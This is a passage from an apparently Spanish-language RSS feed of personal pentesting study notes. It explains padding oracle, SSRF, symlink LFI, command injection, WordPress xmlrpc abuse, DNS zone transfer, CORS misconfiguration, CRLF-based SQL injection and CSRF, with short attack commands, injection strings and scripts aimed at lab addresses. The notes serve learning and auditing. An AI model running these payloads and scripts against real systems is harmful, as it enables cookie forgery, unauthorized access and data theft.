rel="noopener nofollow">CBC_padding</a>. <br> Ahora, para explotar esto, podria ser mediante una cookie de sesión, en donde todo el proceso de la comparación XOR se vera automatizado por una <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> llamada padbuster, en la cual deberemos ingresar la url, el ejemplo del texto cifrado, el tamaño del bloque (multiplos de 8) y opciones adicionales. <br>padbuseter http://192.168.1.39 S3HDJbyq%2BtCPkqTGexIT1czwPA9q4ym8 8 -cookies 'auth=S3HDJbyq%2BtCPkqTGexIT1czwPA9q4ym8' 
Copy<br>De esta manera la herramienta comenzara a descifrar el texto encriptado ingresado 'S3HDJbyq%2BtCPkqTGexIT1czwPA9q4ym8' (el cual se encuentra en la url de sesión) <br>Una vez roto nos dara el valor, por ejemplo auth=dobliuw, haciendo uso de esta misma herramienta, aprovechando de que logramos desencriptar el valor, podremos encriptar lo que deseemos, por ejemplo auth=admin<br>padbuster http://192.168.1.39 S3HDJbyq%2BtCPkqTGexIT1czwPA9q4ym8 8 -cookies 'auth=S3HDJbyq%2BtCPkqTGexIT1czwPA9q4ym8' -plaintext 'auth=admin'
Copy<br>Lo que nos arrojara un valor encriptado que podriamos usar como cookie para de esta manera, realizar un cookie hijacking. <br>Algo que se podria tener en cuenta que podriamos realizar es un ataque de tipo sniper con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> para haciendo uso de payload de tipo bit flipper filtrar bytes para que, por ejemplo, estando logeados como usuario bdmin, comenzar a variar algunos bytes hasta quedar logueados como admin. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/padding-oracle/padding-oracle-(ataque-de-oráculo-de-relleno).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Padding Oracle/Padding Oracle (Ataque de oráculo de relleno).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:41:22 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/cbc.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/cbc.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[¿ Que es un <strong>SSRF</strong> ?]]></title><description><![CDATA[ 
 <br><br>El Server-Side Request Forgery ( SSRF ) es una vulnerabilidad de seguridad en la que un atacante pueda forzar a un servidor web para que realice solicitudes HTTP en su nombre. <br>En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para enviar una solicitud HTTP a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso. <br>El ataque se SSRF puede permitir al atacante acceder a información confidencial, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) ejecutar comandos en el servidor web o en otros servidores en la red interna. <br>Una de las diferencias clave entre el SSRF y el <a data-href="CSRF - (Cross-Side Request Forgery)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/csrf-(cross-side-request-forgery).html" class="internal-link" target="_self" rel="noopener nofollow">CSRF - (Cross-Side Request Forgery)</a> es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante no necesita engañar a un usuario legítimo para hacer click en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa.<br><br><br>Para explotar un SSRF, primero hay que entender los diversos escenarios que podrian haber, en este caso vamos a hacer de manera local dos escenarios diferentes. <br>
<br>


<br>En este caso contamos con un entorno en docker, el cual contiene una máquina ubuntu la cual hostea un servicio web por el puerto 80, su ip es la 172.0.0.2 y contiene un servicio en el puerto 4343 unicamente disponible para el localhost, es decir, que este servicio no esta publico para nadie que no sea la máquina 172.0.0.2.  <br>Ahora bien, esta servicio por el puerto 80 tiene un login.html asi como un recurso de utility.php, siendo este un recurso el cual permite en un punto ingresar un parametro denominado "?url=" en la URL para apuntar a una determinada url ingresada y volcar su contenido. Es en este punto cuando podemos empezar a pensar en un SSRF, ya que si existieran reistricciones en esta maquina las cuales bloquearan determinados puertos para el público, pero de manera interna se permite ver dichos puertos, abusando de alguna utilidad como la de utility.php podriamos realizar FUZZING (Explicado en <a data-href="Fase de Reconocimiento" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/fase-de-reconocimiento.html" class="internal-link" target="_self" rel="noopener nofollow">Fase de Reconocimiento</a>) para intentar enumerar diversos puertos internos que pudiesen llegar a existir los cuales por alguna configuración no esten abiertos al puerots pero si para la maquina en si. <br><br>En este caso, supongamos que la maquina ejecuta el comando python3 -m http.server 4343 --bind 127.0.0.1, de esta manera la máquina victima (172.17.0.2) cuenta con el puerto :80 corriendo disponibles para todos y el puerto :4343 abierto tambien pero solo disponible para su localhost. Aca es donde podemos abusar del archivo utility.php el cual permite apuntar a recursos externos, solo que en este caso, haremos que apunte a todos sus puertos para ver la respuesta que sea distinta para asi determinar que otros puertos contiene abiertos. <br>wfuzz -c -t 200 --hw=8 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"  jugando con wfuzz, podriamos determinar aquellos puertos internos que esten abiertos, dando como resultado asi, que el puerto 80 y 4343 estan abiertos. <br>De esta manera, tendriamos una vía potencial para enumerar puertos abiertos los cuales no deberiamos ver, ya sea que hostean aplicaciones en producción, recursos privilegiados, archivos de configuraciónes, etc. por lo que estariamos explotando un SSRF.<br><br>
<br>


<br>En este caso contamos con un entorno el cual, una vez más tenemos un contenedor de docker que tiene una maquina que hostea un servicio web por el puerto 80, su ip es, una vez más, la 172.17.0.2, con la diferencia de que esta vez no tiene ningun servicio configurado el cual no tengamos accesible, simplemente forma parte de una red interna en donde tiene la ip  asignada de 10.10.0.2 y en esta red, existe otra máquina con la ip 10.10.0.3 la cual si hostea un servicio por el puerto 4343. <br><br>Si quisieramos crear este escenario deberiamos en primer lugar, crear una sub red con el comando docker network create --dirver=bridge {name} --subnet={ip}/{cidr}, luego crear 3 máquinas, una atacante, una producción y otra pre producción. (La máquina de PRO, la creamos como siempre y la agregamos a la red creada con docker network connect {network_name} {machine_name}, la máquna de PRE solo deberia estar en la network creada por lo que la creamos con<br>
docker run -dit --name PRE network={network_name} ubuntu y la  máquina de atacante solo en nuestra red, de esta manera, la máquina atacante esta en la misma red que la de PRO, la PRO en una con PRE y PRE solo en una con PRO. )<br>En este caso el concepto es el mismo pero con un leve <a data-href="Pivoting" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/pivoting/pivoting.html" class="internal-link" target="_self" rel="noopener nofollow">Pivoting</a>, en donde podriamos realizar un SSRF abusando del archivo utility.php (En este ejemplo támbien lo tiene), donde podriamos, luego de realizar cierto reconocmiento, ingresar la url maliciosa para escanear puertos de una máquina en una subred de la máquina principal: http://172.17.0.2/utility.php?url=http://10.10.0.3:464<br><br><br>Algo que se puede intentar hacer a la hora de tener SSRF es enumerar con gopher:// base de datos en caso de que tengamos la certeza (O creencia) de que existe un usuario a nivel base de datos el cual no esta protegido por contraseña.<br>Gopher es un servicio de Internet consistente en el acceso a la información a través de menús. La información se organiza en forma de árbol: solo los nodos contienen menús de acceso a otros menús o a hojas, mientras que las hojas contienen simplemente información textual.<br>Jugando con la herramienta <a data-tooltip-position="top" aria-label="https://github.com/tarunkant/Gopherus" rel="noopener nofollow" class="external-link" href="https://github.com/tarunkant/Gopherus" target="_blank">gopherus</a> que se encarga de generar payloads para listar base de datos haciendo uso de gopher. <br>Una vez generado el payload, al pegarlo en el input vulnerable a <a data-href="SSRF - (Server-Side Request Forgery)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf-(server-side-request-forgery).html" class="internal-link" target="_self" rel="noopener nofollow">SSRF - (Server-Side Request Forgery)</a> se podría ejecutar la accion solicitada, como listar información de la base de datos, intentar alterar datos, etc. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf-(server-side-request-forgery).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/SSRF/SSRF - (Server-Side Request Forgery).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:41:09 GMT</pubDate></item><item><title><![CDATA[SSRF_1stScenario]]></title><description><![CDATA[ 
 
  
  
  
    
  
  :80:4343AtacanteVictima ProduciónPre Producción]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf_1stscenario.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/SSRF/SSRF_1stScenario.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 15:03:11 GMT</pubDate></item><item><title><![CDATA[SSRF_2ndScenario]]></title><description><![CDATA[ 
 
  
  
  
    
  
  RED INTERNA:80AtacanteVíctimaVíctima:8089172.17.0.210.10.0.210.10.0.2ProducciónPre Producción]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf_2ndscenario.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/SSRF/SSRF_2ndScenario.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 15:03:11 GMT</pubDate></item><item><title><![CDATA[Enlace simbólico]]></title><description><![CDATA[ 
 <br><br>Un symlink o enlace simbólico es un tipo de archivo en Linux que apunta a otro archivo o una carpeta en el dispositivo. Los enlaces simbólicos son similaresa a los accesos directos en Windows.<br><br><br>Para abusar de este concepto no existe una única vía, esto depende mucho del escenario y a que nos enfrentamos, pero resulta interesante tener en mente el uso de estos archivos especiales para posibles usos maliciosos. <br>ZIP Files<br>Por ejemplo, algunos archivos de uso común como los archivos comprimidos o zip presentan en su herramienta de uso (zip) la posibilidad de manipular y trabajar con estos tipos de archivos, lo que puede presentar una vulnerabilidad de cara a una web que permita subir archivos zip y muestre su contenido. <br>Una cosa es crear un enlace simbólico que apunte a un archivo, por ejemplo el /etc/passwd y guardarlo en un archivo zip, cuando el servicio web lo interprete y nos muestre el contenido, efectivamente estará el /etc/passwd pero de nosotros.<br>Y otra cosa es hacer uso de la flag --symlinks en donde en lugar de almacenar el contenido del enlace simbólico, se guardara el enlace simbólico y a la hora de ser intepretado por el servicio web se volcará el contenido del archivo al cual estemos queriendo hacer el enlace simbólico, teniendo así un <a data-href="LFI - (Local File Inclusion)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/lfi-(local-file-inclusion).html" class="internal-link" target="_self" rel="noopener nofollow">LFI - (Local File Inclusion)</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/abusing-symbolic-links.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Abusing symbolic links.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:41:31 GMT</pubDate></item><item><title><![CDATA[Reflecting Techniques - PoCs and Polygloths CheatSheet]]></title><description><![CDATA[ 
 <br><br>De cara a una auditoria, muchas veces nos encontraremos con un INPUT en el cual nosotros podemos controlar los valores, es depende de la seguridad y prevención de como este desarrollada la página que podremos llegar a acontecer fallos, explotaciones u ocacionar respuestas no esperadas. Por lo que puede ser interesante tener en cuenta la siguiente <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/pentesting-web/pocs-and-polygloths-cheatsheet" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/pentesting-web/pocs-and-polygloths-cheatsheet" target="_blank">CheatSheet</a> para probar en caso de que tengamos un input vulnerable.<br>Por ejemplo, puede ser intereante de cara a un input como 'username', pensar que este es leido e interpretado en la consola, e intentar muchas maneras diferentes de intentar exlotar este.<br>username='dobliuw; whoami'
username='dobliuw; whoami; echo'
username='dobliuw &amp;&amp; whoami'
username='dobliuw || whoami'
username='dobliuw;${IFS}whoami'
username='dobliuw;${IFS}whoami;${IFS}echo}'
Copy<br>${IFS} es una variable especial que determina cómo se dividen las palabras en una cadena cuando se realiza una expansión de campo o una separación de palabras en una shell de Unix. Con esta variable se puede lograr que la entrada del usuario se interprete como una expansión de campo y puede tener un impacto en la forma en que se procesa la cadena.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/abusing-user-inputs.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Abusing USER INPUTS.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:43:09 GMT</pubDate></item><item><title><![CDATA[XMLRPC.php]]></title><description><![CDATA[ 
 <br><br>El xmlrpc.php en Wordpress es un archivo cxon extensión .php que permite realizar tareas remotas por el método conocido como POST en programación, como por ejemplo, publicar o editar artículos o entradas. <br><br><br>Cuando nos referimos a abusar del xmlrpc.php hacemos alución al uso que podríamos llegar a obtener gracias a este archivo. <br><br><br>Si envíamos como data en una solicitud por POST el siguiente payload (Obtenido de la web oficial de <a data-tooltip-position="top" aria-label="https://codex.wordpress.org/XML-RPC/system.listMethods" rel="noopener nofollow" class="external-link" href="https://codex.wordpress.org/XML-RPC/system.listMethods" target="_blank">wordpress</a>)<br>&lt;methodCall&gt;
  &lt;methodName&gt;system.listMethods&lt;/methodName&gt;
  &lt;params&gt;&lt;/params&gt;
&lt;/methodCall&gt;
Copy<br>Con herramientas como curl, podríamos ver en la respuesta del servidor un listado de los metodos que podemos usar para abusar de estos como la enumeración de usuarios, la edición de posts, etc. <br>curl -s -X POST {url} -s '&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;'
Copy<br><br><br>Para poder obtener los posts de la página y a la par verificar que las credenciales que tenemos que tener sean válidas, podríamos intentar obtener los posts de la web. Para esto podemos hacer uso del modulo python-wordpress-xmlrpc para con python hacer uso de un script y obtener los valores que necesitemos.<br>pip3 install python-wordpress-xmlrpc
Copy<br> De esta manera podríamos hacer uso de este modulo para crear un script en python y obtener valores<br>from wordpress_xmlrpc import Client 
from wordpress_xmlrpc.methods import posts
client = Client('{url_xmlrpc.php}', '{username}', '{password}')
post = client.call(posts.GetPosts())
Copy<br>De esta manera en la variable post ahora tendríamos todos los posts publicados. <br>post # Listar los posts
dir(post[0]) # Listar los attributos del primer post 

# Listar atributos
post[0].link
post[0].id
Copy<br><br><br>Una vez que tengamos los posts en la página, tal vez exista una vía potencial para cambiar un codigo que se ejecuta en php u otras funcionalidades. <br>from wordpress_xmlrpc import Client 
from wordpress_cmlrpc.methods import posts
client = Client('{url_xmlrpc.php}', '{username}', '{password}')
post = client.call(posts.GetPosts())
 
malicious_post = post[0] # Podríamos quedarnos con el post que querramos editar
malicious_content = "{new_malicious_content}" 
malicious_post.content = malicious_content

client.call(posts.EditPost(malicious_post.id, malicious_post)) # A esta función se le debe pasar el identificador del post a modificar y el nuevo post modificado
Copy<br>De esta manera tal vez exista un post en la página el cual ejecute una función en php y haciendo uso de esto podríamos intentar cambiar esto para inyectar nuestros comandos maliciosos. <br><br><br>Otra cosa que podríamos intentar hacer es subir archivos maliciosos al sistema, de esta manera podríamos desplegar en una ruta de la web nuestro propio script malicioso.<br>from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import media 
client = Client('{url_xmlrpc.php}', '{username}', '{password}')

with open("{mcalicious_file_to_upload}", "r") as f:
	filename = f.read()

post_file = {'name':'{filename}','bits':filename,'type':'{content-type}'}

client.call(media.UploadFile(post_file))
Copy<br>De esta manera, si la web esta desplegada bajo la ruta /var/www/html en caso de que la subida del archivo sea exitosa, nos arrojara información como el path donde estará alojado este archivo. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/abusing-xmlrpc.php-(wordpress).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Abusing xmlrpc.php - (Wordpress).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:43:18 GMT</pubDate></item><item><title><![CDATA[¿ Que es un <strong>ataque de transferencia de zona</strong> ?]]></title><description><![CDATA[ 
 <br><br>Los ataques de transferencia de zona, también conocidos como ataques AXFR, son un tipo de ataque que se dirige a los servidores DNS (Domain Name System) y que permite a los atacantes obtener información sensible sobre los dominios de una organización. <br>En términos simples, los servidores DNS se encargan de traducir los nombres de dominio legibles por humanos en direcciones Ip utilizables por las máquinas. Los ataques de AXFR permiten a los atacantes obtener información sobre los registros DNS almacenados en un servidor DNS. <br>El ataque AXFR se lleva a acabo enviando una solicitud de transferencia de zona desde un servidor DNS falso a un servidor DNS legítimo. Esta solicitud se realia utilizando el protocolo de trasnferencia de zona DNS (AXFR), que es utilizado por los servidores DNS para transferir registros DNS de un servidor a otro. <br>Si el servidor DNS no está configurado correctamente, puede responder a la solicitud de transferencia de zona y proporcionar al atacante información detallada sobre los registros DNS almacenados en el servidor. Esto incluye información como los nombres de dominio, direcciones IP, servidores de correo electrónico y otra información sensible que puede ser utilizada en futuros ataques. <br><br><br>Para prevenir los ataques AXFR, es importantes que los administradores de red configuren adecuadamente los servidores DNS y limiten el acceso a la transferencia de zona solo a servidores autorizados. También es importante mantenes actualizado el software del servidore DNS y utilizar téncinas de cifrado y autenticación fuertes para proteger los datos que se transmiten a través de la red. Los administradores también pueden utilizar herramientas de monitoreo de DNS para detectar y prevenir posibles ataques de transferencia de zona. <br><br><br>Un ataque de AXFR es un intento de transferencia de zona COMPLETO, mientras que un ataque de IXFR que son ataques de transferencia de zona incrementales, es decir, se transfiere información parcial, partiendo de la ultima transferencia que se hizo hasta cuando se solicita. <br>Para explotar este ataque, podemos hacer uso de dig, una de las muchas <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> que existen.<br># Sintaxis 
dig {consulta} @{DNS-Server} {domain-name}

# Enumeración de servidores de correo 
dig mx @192.168.1.38 dobliuw.local
# Enumeración de name servers 
dig ns @192.168.1.38 dobliuw.local
# Transferencia de zona 
dig axfr @192.168.1.38 dobliuw.local
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/axfr-full-zone-transfe.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/AXFR - Full Zone Transfe.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:43:23 GMT</pubDate></item><item><title><![CDATA[¿ Que es el <strong>CORS</strong> ?]]></title><description><![CDATA[ 
 <br><br>El intercambio de recursos de origin cruzado (CORS) es un mecanismo que permite que un servidor web restrinja el acceso a recursos de diferentes orígenes, es decir, de diferentes dominios o protocolos. CORSS se utiliza para proteger la privacidad y seguridad de los usuarios al evitar que otros sitios web accedan a información confidencial sin permiso. <br>Supongamos que tenemos un aplicación web en el domion "example.com" que utiliza una API web en el domio "api.example.com" para recuperar datos. Si la aplicación web está correctamente configurada para CORS, solo permitirá solicitudes de origen cruzado desde el domion "example.com" a la API en el dominio "api.example.com". SI se realiza un sollicitud desde un dominio diferente, como "dobliuw.com", la solicitud será bloqueada por el navegador web. <br>Sin embargo, si la aplicación web no está correctamente configurada para  CORS, un atacante podría aprobecharse de esta debilidad para acceder a recursos y datos confidenciales. Por ejemplo, si la aplicación web no valida la autorización del usuario para acceder a los recursos, un atacante podría inyectar código malicioso en un página web para realizar sollicitudes a la API de la aplicación en el dominio "api.example.com". <br>Un atacante podría utilizar herramientas automatiadas para probar diferentes valores de encabezados CORS y encontra un configuración incorrecta que permita la solicitud desde otro dominio. Si el atacante tien éxito, podría acceder a recursos y adatos condifenciales que no deberían estar disponibles desde su sitio web. Por ejemplo, podría recuperar la información de inicio de sesión de los usuarios, modificar losdatos de la aplicación, etc. <br><br><br>Para prevenir este tipo de atauqe, es importante configurar adecuadamente CORS en la aplicación  web y asegurarse de que solo se permitan solicitudes de origen cruzado desde dominios confiables. <br><br><br>Para explotar esto, en caso de que a la hora de realizar una petición e interceptarla con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> veamos que acepta el intercambio de recursos de origen cruzado para todas las direcciones webs, es decir Access-Control-Allow-Origin: *, podríamos pensar en intentar abusar de esta mala configuración de cors.<br>
También se podría realizar un ataque de fuerza bruta remplazando la cabecera Origin: para ver los casos en el que se muestra en la respuesta la cabecera Access-Control-Allow-Origin (Sobre todo para subdominios).<br>Por lo que, por ejemplo, podriamos intentar crear un servidor 3ro propio en donde tengamos alojado un script para que cuando el usuario se meta realize una petición a un recurso privilegiado y obtener los datos de la web, incluso pudiendo clonar esta, por ejemplo el sig. script:  <br>&lt;script&gt;
   const reqListener = () =&gt; {
       document.getElementById("stolenInfo").innerHTML = req.responseText; 
   }

   const req = new XMLHttpRequest();
   req.onload = reqListener
   req.open('GET', 'http://localhost:5000/confidential', true); 
   req.withCredentials = true;
   req.send(); 

&lt;/script&gt;


&lt;center&gt;&lt;h1&gt; You has been pwned! &lt;/h1&gt;&lt;/center&gt; 
&lt;p id="stolenInfo"&gt;&lt;/p&gt;
Copy<br>Algo que suele pasar es declararse las reglas de manera erronea, por ejemplo, para el dominio dominio-a.com, se permite CORS con *.dominio-a.com, lo que permite burlar esta validación regristrando un dominio remplazanod el primer . por un caracter, pudiendo tener conexión con el servidor con un dominio como Fdomino-a.com ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/cors-(cross-origin-resource-sharing).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/CORS - (Cross-Origin Resource Sharing).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:43:28 GMT</pubDate></item><item><title><![CDATA[<a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a" target="_blank">Inyección CRLF</a>]]></title><description><![CDATA[ 
 <br><br>Las CRLF Injection (Inyecciones de Carriage Return Line Feed) son ataques informátivos en los que un atacante introduce caracteres de retorno de carro (CR) y avance de línea (LF) en datos enviados a una aplicación web. Esto puede ser explotado para realizar diversas acciones maliciosas, como la inserción de contenido no deseado, la modificación de encabezados HTTP o incluso el secuestro de sesiones. Estos ataques se parovechan de la forma en que las aplicaciones interpretan y procesan los caracteres de controlo en las cadenas de texto. <br>Esta téncica puede ser muy efectiva para bypasear el proceso de filtrado a través de la implementación de expresiones regulares (REGEX).<br>Ejemplo: preg_match("/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]\\|;:'\",.&lt;&gt;\/?]|[^0-9]$/", $user_id, $match)<br><br>SELECT username FROM users WHERE user_id='%d'
Copy<br><br>SELECT username FROM users WHERE user_id="1%0d%0a' UNION+SELECT+schema_name+FROM+information_schema.schemata"
Copy<br>Esta query maliciosa abusa del payload URL encodeado %0d%0a, que se decodifican como secuencias de retorno de carro (\r) y salto de línea (\n). Por lo que a la hora de realizar la regex, esta será pasada debido a que la query maliciosa es indicada en una línea aparte, y el 1 inicial cumple con la regex (En un escenario en donde se puedan indicar números).<br><img alt="regex_CRLF_injection.png" src="https://dobliuw.com/lib/media/regex_crlf_injection.png"><br>Como se puede ver en este ejemplo, la introducción de un carácter de salto de línea resulta en la incapacidad de las expresiones regulares para efectura una coincidencia con nuestra entrada de deatos. Este efecto de evación propicia la capacidad de inyectar la consulta SQL de manera exitosa.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/crlf-injection-(
).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/CRLF Injection (%0d%0a).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 21 Aug 2024 22:28:33 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/regex_crlf_injection.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/regex_crlf_injection.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[¿ Que es <strong>CSRF / XSRF</strong> ?]]></title><description><![CDATA[ 
 <br><br>El Cross-Side Request Forgery ( CSRF ) es una vulnerabilidad de seguridad en la que un atacante engaña a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.<br>En un ataque CSRF, el atacante engaña a la vícitima para que haga click en un enlace malicioso o visite un página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la vícitma. <br>Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace click en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso. <br>Este ataque puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de información de la cuenta, la eliminación de  datos y mucho más. <br><br><br>Para explotar un CSRF se necesita identificar el mismo, para hacerlo, podemos jugar con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a>.... Supongamos que tenemos la página http://dobliuw.com en donde hay una sección de cambiar contraseña: <br><img alt="ChangePassword.png" src="https://dobliuw.com/lib/media/changepassword.png"><br>Si nosotros ingresamos la nueva contraseña e interceptamos con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> la petición, vemos que es una petición HTTP de tipo POST tal que asi: <br><img alt="changePasswordCSRF.png" src="https://dobliuw.com/lib/media/changepasswordcsrf.png"><br>Como sabemos, el CSRF consiste en una petción que realiza el usuario siendo engañado, por lo que podriamos probar si esta sección de la página<br>
http://dobliuw.com/action/usersettings/changepassword es vulnerable a un posible CSRF,  para ello simplemente tenemos que realizar un click derecho &gt; change method request y cambiar esta petción de tipo POST a GET, en caso de que al enviar la petción habiendo sido cambiada a GET la misma funcione, es decir, que en este ejemplo cambie la contraseña, podriamos pensar en un CSRF. <br><img alt="GET_CSRF.png" src="https://dobliuw.com/lib/media/get_csrf.png"><br>Una vez que vemos que una petición que podria ser por POST es cambiada a GET y funciona, podriamos ingeniarnosla para que a la victima clickee en el enlace o carge el recurso para asi que el o ella tramite esta petición, dando como resultado que se cambie (En este ejemplo) su contraseña. <br>Es importante tener en cuenta que en un escenario real fuera de este ejemplo, las peticiones conlleven tokens, identificadores de usuarios, lo que conllevaria a ver si existe una manera de descubrir el id de la victima, o si los tokens son realmente necesarios, incluso si mediante otros ataques como <a data-href="XSS  - ( Cross-Site Scripting )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xss-(-cross-site-scripting-).html" class="internal-link" target="_self" rel="noopener nofollow">XSS  - ( Cross-Site Scripting )</a> se pueden obtener, etc. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/csrf-(cross-side-request-forgery).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/CSRF - (Cross-Side Request Forgery).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:43:55 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/changepassword.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/changepassword.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[¿ Que es <strong>CSS</strong> ?]]></title><description><![CDATA[ 
